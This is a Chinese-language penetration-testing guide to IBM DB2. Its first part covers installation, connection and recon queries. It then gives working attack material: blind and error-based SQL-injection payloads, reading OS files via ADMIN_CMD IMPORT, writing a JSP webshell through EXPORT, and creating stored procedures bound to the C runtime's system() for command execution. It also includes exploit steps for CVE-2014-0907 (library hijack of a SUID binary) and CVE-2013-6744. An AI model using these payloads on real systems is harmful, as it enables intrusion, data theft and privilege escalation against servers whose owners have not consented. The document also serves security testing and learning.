# DB2渗透

DB2 是 IBM 公司推出关系型数据库管理系统。

现今 DB2 主要包含以下三个系列：

*   DB2 for Linux, UNIX and Windows(LUW)

*   DB2 for z/OS

*   DB2 for i(formerly OS/400)

IBM DB2 定位于高端市场，广泛应用于企业级应用中

以下两小节分别介绍 DB2 在 Linux 和 Windows 平台下的安装，安装的版本都为 V9.5 版本

DB2 在 Linux 下的安装

----------------

在 Linux 下 DB2 依赖 compat-libstdc++ 库，安装 DB2 之前需要先行安装该库

安装上述库完成后运行 DB2 安装程序中的 db2setup 启动图形化安装界面

![pic1](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409533544379140.png)

DB2 在安装过程中会创建 db2inst1、db2fenc1 以及 dasusr1 三个用户，此三个用户会加入到系统中成为系统的用户，也可以在安装之前就创建

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409534023289224.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409534583781320.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409535017204418.png)

安装完成后切换到 db2inst1 用户，运行 db2cc 启动图形化控制中心（DB2 从 V10.1 版本开始不再包含图形化的控制中心，可使用命令行或 IBM 提供的 Data Studio 工具管理）

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409535514716510.png)

DB2 在 Windows 下的安装

------------------

运行安装程序中的 setup.exe 程序开始安装，安装过程中会创建 db2admin 用户，并将该用户添加到管理员组中

安装完成后启动控制中心

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/201606140954027464769.png)

DB2 服务及端口

---------

DB2 各项服务名称及端口可使用以下方法查看：

Linux：

```

/etc/services 文件

```

Windows：

```

C:\Windows\System32\driversetc\services文件

```

DB2 默认监听连接的端口为 50000

DB2 的用户

-------

DB2 的所有用户都是操作系统用户，且用户密码也与操作系统中该用户的密码绑定。

Linux 下，安装 DB2 会创建 db2inst1，db2fenc1 和 dasusr1 三个用户。Windows 下，会创建 db2admin 用户并将其添加到管理员组。

本地操作系统用户并不全为 DB2 用户，需要在 DB2 管理功能中添加操作系统用户为数据库用户。

本地管理 DB2

--------

### 命令行方式

本地管理 DB2 数据库可以使用命令行或图形化工具

IBM DB2 Universal Database（UDB）命令行处理器（CLP）是用于访问 DB2 函数的方便接口，CLP 接受来自 DB2 命令行的命令或 SQL 语句。

在基于 Linux 和 UNIX 的系统中，这个命令行是 DB2 实例的命令行。

在 Windows 操作系统中，它是启用了 CLP 命令窗口的命令行；在这种情况下，必须先（从普通命令窗口）运行 db2cmd 命令来启动 DB2 命令行环境。

Windows 下的命令行：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/201606140954071527278.png)

Linux 下的命令行：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/201606140954125106889.png)

命令行的详细使用方法及语法可参考 IBM 官方文档

### 图形界面方式

可使用 DB2 的控制中心在本地使用图形化方式管理 DB2，如下：

Windows：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/201606140954181190199.png)

Linux：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409542310077108.png)

注：  

DB2 从 V10.1 版本开始不再包含图形化的控制中心，可 IBM 提供的 DataStudio 工具替换

远程管理 DB2

--------

远程管理 DB2 也有命令行和图形化两种方式，使用命令行方式需要安装 DB2 客户端，可在 IBM 官网上下载。

远程图形化管理可以使用 Quest Centor for DB2 工具。使用该工具也需要安装 DB2 客户端。

该工具使用方法如下：

右键添加 DB2 服务器：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/20160614095428886111113.png)

配置 DB2 服务器的地址和操作系统：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/20160614095433878111211.png)

配置节点名称，实例名称和数据库端口：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/20160614095440158451310.png)

在实例上右键管理登录配置登录凭证：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409544430519148.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409544794594158.png)

在实例上右键添加数据库：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409545080923166.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409545450076176.png)

添加后情况：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409545628336186.png)

执行 SQL 语句：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409545889082195.png)

在 JAVA 程序中连接 DB2

----------------

JAVA 程序连接 DB2 有四种方式 TYPE1、TYPE2、TYPE3、TYPE4，其中 TYPE2 和 TYPE4 应用较广泛，四种方式的基本架构如下：

TYPE1：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/201606140955025050720.jpg)

TYPE2：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/201606140955069893721.jpg)

TYPE3：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/201606140955104132622.jpg)

TYPE4：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/201606140955141546323.jpg)

下面介绍使用 TYPE2 和 TYPE4 方式连接 DB2 的方法

使用 TYPE2 方式必须安装 DB2 客户端, 在客户端中添加相关数据库并设置别名，可使用客户端命令行或图形化工具 “配置助手” 添加，如下图

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409551983668244.png)

使用 TYPE2 类型有两种方法：

**方法一：**

驱动程序位于 db2jcc.jar 包中，且在 Windows 下 JDK 必须可以访问到 db2jdbc.dll 和 db2jcct2.dll，db2jdbc.dll 和 db2jcct2.dll 位于 DB2 客户端程序 SQLLIB/BIN 目录下

连接代码如下：

```

#!java

Class.forName("com.ibm.db2.jcc.DB2Driver").newInstance();       

conn = DriverManager.getConnection("jdbc:db2:TESTDB2", "db2admin", "123456");

```

其中`jdbc:db2:TESTDB2`中的`TESTDB2`即为之前在客户端中添加的数据库别名

**方法二：**

驱动程序位于 db2java.zip 包中，且在 Windows 下 JDK 必须可以访问到 db2jdbc.dll，db2jdbc.dll 位于 DB2 客户端程序 SQLLIB/BIN 目录下

连接代码如下：

```

#!java

Driver driver=(Driver) Class.forName("COM.ibm.db2.jdbc.app.DB2Driver").newInstance(); 

DriverManager.registerDriver(driver);

conn = DriverManager.getConnection("jdbc:db2:TESTDB2", "db2admin", "123456");

```

其中`jdbc:db2:TESTDB2`中的`TESTDB2`即为之前在客户端中添加的数据库别名

注：db2java.zip 在 DB2 LUW 10.1 中已停用，如要使用 TYPE2 方式建议使用 db2jcc.jar 驱动程序

使用 TYPE4 方式连接 DB2 方法：

驱动程序位于 db2jcc.jar 包中，使用此方法应用程序所在主机不需安装任何其他程序

连接代码：

```

#!java

Class.forName(com.ibm.db2.jcc.DB2Driver).newInstance();

conn =DriverManager.getConnection(jdbc:db2://192.168.60.144:50000/TESTDB2, db2admin, 123456);

```

注：

1.  TYPE4 需设置数据库的编码为 utf-8 否则报错

2.  TYPE4 还需要 db2jcc_license_cu.jar

上述驱动程序所在包 db2jcc.jar、db2jcc_license_cu.jar、db2java.zip 均可在 DB2 服务器安装目录下找到，例如在 Windows 版本 V9.5 中位于 DB2 安装目录下的 SQLLIB/java 目录

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409552483673254.png)

db2jcc.jar 与 db2java.zip 驱动程序在错误处理方面有所不同

查询在 DB2 服务器端出现错误时，db2java.zip 驱动程序会将 DB2 服务器产生的错误信息原样返回给应用程序，而 db2jcc.jar 驱动程序使用了自定义的错误信息。

db2java.zip 的错误信息：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409552991053264.png)

db2jcc.jar 的错误信息：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409553542698274.png)

获取 DB2 数据库信息的语句

---------------

获取数据库版本：

```

#!sql

SELECT service_level FROM table(sysproc.env_get_inst_info()) as instanceinfo

```

获取当前用户：

```

#!sql

SELECT user FROM sysibm.sysdummy1

SELECT session_user FROM sysibm.sysdummy1

SELECT system_user FROM sysibm.sysdummy1

```

获取数据库的用户：

```

#!sql

SELECT distinct(authid) FROM sysibmadm.privileges

SELECT distinct(grantee) FROM sysibm.systabauth

```

获取数据库表的权限：

```

#!sql

SELECT * FROM syscat.tabauth

```

获取当前用户的权限：

```

#!sql

SELECT * FROM syscat.tabauth where grantee = current user

```

列出数据库的 DBA 账户：

```

#!sql

SELECT distinct(grantee) FROM sysibm.systabauth where CONTROLAUTH='Y'

```

获取当前数据库：

```

#!sql

SELECT current server FROM sysibm.sysdummy1

```

获取当前数据库中所有表：

```

#!sql

SELECT table_name FROM sysibm.tables

SELECT name FROM sysibm.systables

```

获取当前数据库中所有列：

```

#!sql

SELECT name, tbname, coltype FROM sysibm.syscolumns

```

获取数据库所在主机相关信息：

```

#!sql

SELECT * FROM sysibmadm.env_sys_info

```

DB2 SQL 语句特性

------------

注释符：

DB2 数据库使用双连字符`--`作为单行注释，使用`/**/`作为多行注释

SELECT 中获得前 N 条记录的 SQL 语法：

```

#!sql

SELECT * FROM sysibm.systables ORDER BY name ASC fetch first N rows only

```

截取字符串：

```

#!sql

SELECT substr('abc',2,1) FROM sysibm.sysdummy1

```

上述语句会得到字符 b

比特操作 AND/OR/NOT/XOR

```

#!sql

SELECT bitand(1,0) FROM sysibm.sysdummy1

```

上述语句会得到 0

字符与 ASCII 码互相转换：

```

#!sql

SELECT chr(65) FROM sysibm.sysdummy1

```

上述语句会得到字符’A’

```

#!sql

SELECT ascii('A') FROM sysibm.sysdummy1

```

上述语句会得到字符’A’的 ASCII 码 65

类型转换：

```

#!sql

SELECT cast('123' as integer) FROM sysibm.sysdummy1

```

上述语句将字符串”123” 转为数据 123

```

#!sql

SELECT cast(1 as char) FROM sysibm.sysdummy1

```

上述语句将数字 1 转为字符串”1”

字符串连接：

```

#!sql

SELECT 'a' concat 'b' concat 'c' FROM sysibm.sysdummy1

SELECT 'a' || 'b' || 'c' FROM sysibm.sysdummy1

```

上述两个语句都会返回字符串”abc”

获取长度：

```

#!sql

SELECT LENGTH(NAME) FROM SYSIBM.SYSCOLUMNS WHERE TBNAME='VOTE' ORDER BY NAME DESC FETCH FIRST 1 ROWS ONLY

```

条件语句：

```

#!sql

SELECT CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB' END FROM sysibm.sysdummy1

```

上述语句将返回字符串’AAAAAAAAAA’

时间延迟：

```

#!sql

and (SELECT count(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (SELECT ascii(substr(user,1,1)) FROM sysibm.sysdummy1)=68

```

上述语句若 user 的第一个字符的 ASCII 码为 68 将造成延时

UNION 操作符：

DB2 支持在 SELECT 语句中使用 UNION 操作符，UNION 的各列必须类型相同才不会报错。

且不能直接使用`SELECT … FROM … UNION SELECT NULL, NULL … FROM …`的方法。DB2 在 SELECT 中使用 NULL 需要指定类型，如下：

```

#!sql

select ... cast(NULL as int) as column_A, cast(NULL as varchar(128)) as column_B, ... FROM ...

```

多语句查询：

DB2 不支持形如 statement1; statement2 形式的多语句查询

DB2 的 SQL 注入方法

--------------

对 DB2 进行 SQL 注入通用的方法是使用盲注，利用上两个小结的内容通过盲注获取数据库信息。

由于 DB2 的 UNION 操作符限制较多，因此利用 UNION 注入很多时候不会成功。由于 DB2 不支持多语句查询，因此无法通过多语句查询方法注入并调用存储过程。

另外，可利用数据库的报错信息通过 SQL 注入获取部分敏感信息，如下：

先使用通用的 orderby 方法猜出列数

在查询的条件后附加`group by 1--`会显示本次查询的表中的第一列列名 ID，之后将条件改为`group by ID--`得到第二列的列名 NAME，依次增加 group by 后的列名，如 group by ID, NAME，将枚举当前表中的所有列

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409554153166284.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409554671164293.png)

DB2 的 SQL 注入工具

--------------

经测试针对 DB2 的 SQL 注入工具中 sqlmap 相对具有可用性，部分截图如下：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409555043383303.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/20160614095554786413110.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409555745867324.png)

但经测试其仍然存在一些问题，如获取列信息不全、盲注功能不好用等

在渗透测试中可以使用 DB2 读写系统文件，达到获取敏感信息、写 webshell 等目的。

本节所描述方法在 DB2 V9.5 Windows, Linux 下测试成功

利用 DB2 读操作系统文件

--------------

DB2 使用 IMPORT 命令从文件中读取内容并插入到数据库表中，使用方法：

```

#!sql

IMPORT FROM C:\Windows\win.ini OF DEL INSERT INTO CONTENT

```

上述命令运行后即可将 C:Windowswin.ini 的内容插入到表 CONTENT 中

DB2 的 ADMIN_CMD 存储过程用于执行 DB2 命令行（CLP）命令，其 schema 为 SYSPROC，从 8.2.2 版本开始引入 该存储过程语法：

```

#!sql

ADMIN_CMD('command_string')

```

参数 command_string 为要运行的命令

调用存储过程使用 CALL 语句，语法：

```

#!sql

CALL ADMIN_CMD('command_string')

```

调用 ADMIN_CMD 存储过程执行 IMPORT 命令将文件读入数据库表方法：

```

#!sql

CALL ADMIN_CMD('IMPORT FROM C:\Windows\win.ini OF DEL INSERT INTO CONTENT');

```

运行该存储过程的结果：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409560263706333.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409560685731343.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409561032185352.png)

远程连接数据库的用户可以通过调用 ADMIN_CMD 存储过程读取操作系统文件，经测试（DB2 V9.5）数据库普通用户默认具有调用 ADMIN_CMD 存储过程的权限，远程连接数据库的用户可以首先创建一个表（或对已存在的 IMPORT 命令涉及的表有 INSERT 和 SELECT 权限），然后调用 ADMIN_CMD 存储过程运行 IMPORT 命令将文件读入创建的表中。如下：

远程连接数据库并调用 ADMIN_CMD 存储过程运行 IMPORT 命令：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409561462278362.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409561792929372.png)

读取的文件信息：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409562030338382.png)

利用 DB2 向操作系统写文件

---------------

DB2 的 EXPORT 命令用于将数据库中的内容导入到文件中，使用语法如下：

```

#!sql

EXPORT TO result.csv OF DEL MODIFIED BY NOCHARDEL SELECT col1, col2, coln FROM testtable;

```

使用上一小节提到的 ADMIN_CMD 存储过程运行该命令方法：

```

#!sql

CALL SYSPROC.ADMIN_CMD ('EXPORT TO C:\RESULT.TXT OF DEL MODIFIED BY NOCHARDEL SELECT * FROM VOTENAME');

```

调用过程和结果：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409562476974392.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409562771133402.png)

远程连接数据库的用户可以先创建一个表（或对 EXPORT 命令涉及的表具有 SELECT 权限），然后调用 ADMIN_CMD 存储过程执行 EXPORT 命令向操作系统写文件

向操作系统写入包含某些字符串的文件语法如下：

```

#!sql

CALL SYSPROC.ADMIN_CMD ('EXPORT TO C:\RESULT.TXT OF DEL MODIFIED BY NOCHARDEL SELECT ''My Content'' FROM VOTENAME FETCH FIRST 1 ROWS ONLY');

```

远程调用结果：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409563116238419.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409563596262423.png)

利用该方法写 webshell 语法：

```

#!sql

CALL SYSPROC.ADMIN_CMD ('EXPORT TO C:\RESULT.jsp OF DEL MODIFIED BY NOCHARDEL SELECT ''<%if(request.getParameter("f")!=null){(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("c").getBytes());response.getWriter().print("[OK]");}%>'' FROM VOTENAME FETCH FIRST 1 ROWS ONLY');

```

远程调用结果：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409564030535433.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409564594816442.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409564976283452.png)

注：  

通过 EXPORT 向文件写入自定义字符串内容时 SELECT 的表中必须至少有一条记录否则写入内容为空

可利用 DB2 存储过程执行操作系统命令。远程连接数据库的用户需要具有创建存储过程的权限，连接数据库后创建一个可以执行操作系统命令的存储过程并调用。

创建此种存储过程并调用的语法如下：

Windows：

```

#!sql

CREATE PROCEDURE db2_cmd_exec (IN cmd varchar(200))

EXTERNAL NAME 'c:\windows\system32\msvcrt!system' 

LANGUAGE C 

DETERMINISTIC 

PARAMETER STYLE DB2SQL

CALL db2_cmd_exec ('whoami /all > C:\whoami.log')

```

Linux：

```

#!sql

CREATE PROCEDURE db2_cmd_exec (IN cmd varchar(200))

EXTERNAL NAME '/usr/lib/libstdc++.so.6!system' 

LANGUAGE C 

DETERMINISTIC 

PARAMETER STYLE DB2SQL

call db2_cmd_exec ('whoami > /tmp/whoami.log')

```

运行结果：

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409565230884462.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409565550799472.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409565920633482.png)

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409570371165492.png)

注：

创建的存储过程默认为 FENCED（受保护的），例如对于 Linux 下 DB2 的，使用 db2inst1 用户连接数据库创建并运行上述存储，DB2 服务器端实际是以 db2fenc1 用户运行该存储过程的。

FENCED 存储过程单独启用一个新的地址空间，而 UNFENCED 存储过程和调用它的进程使用用一个地址空间，一般来说 FENCED 存储过程比较安全。

若要创建 NOTFENCED 的存储过程（需要具有 SYSADM 特权、DBADM 特权或一个特殊的特权（CREATE_NOT_FENCED）），需要在创建存储过程中指定，如下

```

#!sql

CREATE PROCEDURE db2_cmd_exec (IN cmd varchar(200))

EXTERNAL NAME '/usr/lib/libstdc++.so.6!system' 

LANGUAGE C 

DETERMINISTIC 

PARAMETER STYLE DB2SQL

NOT FENCED

```

本节介绍两个 DB2 提权漏洞原理及利用方法

CVE-2014-0907

-------------

CVE-2014-0907 是一个 DB2 本地提权漏洞，受影响版本为 AIX, Linux, HP-UX 以及 Solaris 上的 DB2 V9.5（FP9 之前的 V9.5 不受影响）, V9.7, V10.1, V10.5 版本

CVE-2014-0907 漏洞允许一个本地普通用户获取到 root 权限

DB2 的 db2iclean 程序会在当前目录下搜索 libdb2ure2.so.1 库文件，下图为执行该程序时对库文件的访问情况，可见 DB2 对于 libdb2ure2.so.1 库文件的搜索在当前目录先于 DB2 安装目录

```

#!sql

strace -o /tmp/db2iclean.log  /home/db2inst1/sqllib/adm/db2iclean

```

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409570823773502.png)

如果当前目录下有恶意用户写入的同名库文件，则 DB2 程序会加载该文件并执行其中的代码。由于 db2iclean 命令是 SUID root 权限，因此恶意代码会以 root 权限被运行。

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409571335027511.png)

如将下列代码编译为库文件并放在当前目录下：

```

#!cpp

// libdb2ure2.cpp

#include <stdlib.h>

int iGetHostName(char* n, int i)

{

​    system("id > /m.log");

}

$ gcc -shared -o libdb2ure2.so.1 libdb2ure2.cpp

```

使用 db2iadm1 组的普通用户运行 db2iclean 程序：

```

#!sql

<DB2_instance_install_directory>/adm/db2iclean

```

可见此时 euid 为 0，代码以 root 权限运行

![](/Users/seven/Desktop/pocs/database/db2/db2.assets/2016061409571660608521.png)

注意：由于 db2iclean 不是公开执行权限，所以攻击者需要使用 db2iadm1 组用户执行，或诱使该组成员在攻击者写入了恶意库文件的目录下执行该程序。

CVE-2013-6744

-------------

CVE-2013-6744 是 DB2 在 windows 平台下的提权漏洞，利用该漏洞将使 windows 普通用户获取到 Administrator 权限

存在漏洞的 DB2 版本：

*   9.5, 9.7 FP9a 之前版本

*   10.1 FP3a 之前版本

*   10.5 FP3a 之前版本

利用该漏洞需要有一个可以连接 DB2 数据库的用户，且该用户具有创建外部例程的权限 (CREATE_EXTERNAL_ROUTINE)

该漏洞原理为：在 Windows 平台特权帐户默认情况下，DB2 服务运行时并不受访问控制检查，这意味着可以通过 CREATE_EXTERNAL_ROUTINE 权限创建一个库文件并且形成调用，从而权限得以提升。

漏洞利用步骤：

1. 使用具有 CREATE_EXTERNAL_ROUTINE 权限的用户运行以下 DDL，利用 C runtime system 来创建一个存储过程：

```

#!sql

CREATE PROCEDURE db2_exec (IN cmd varchar(1024)) EXTERNAL NAME 'msvcrt!system' LANGUAGE C DETERMINISTIC PARAMETER STYLE DB2SQL

```

2. 调用刚才创建的存储过程：

```

#!sql

CALL db2_exec('whoami /all > C\:whoami.log')

```

查看命令创建的 whoami.log 文件，发现包含了 db2admin 信息。这意味着，我们用一个非管理员账户成功用管理员权限执行了命令。

*   [http://en.wikipedia.org/wiki/IBM_DB2](http://en.wikipedia.org/wiki/IBM_DB2)

*   [http://www.ibm.com/developerworks/cn/data/library/techarticles/dm-0503melnyk/](http://www.ibm.com/developerworks/cn/data/library/techarticles/dm-0503melnyk/)

*   [http://www.sqlinjectionwiki.com/Categories/7/ibmdb2-sql-injection-cheat-sheet/](http://www.sqlinjectionwiki.com/Categories/7/ibmdb2-sql-injection-cheat-sheet/)

*   [http://www-01.ibm.com/support/docview.wss?uid=swg21672100](http://www-01.ibm.com/support/docview.wss?uid=swg21672100)

*   [http://blog.spiderlabs.com/2014/07/about-two-ibm-db2-luw-vulnerabilities-patched-recently.html](http://blog.spiderlabs.com/2014/07/about-two-ibm-db2-luw-vulnerabilities-patched-recently.html)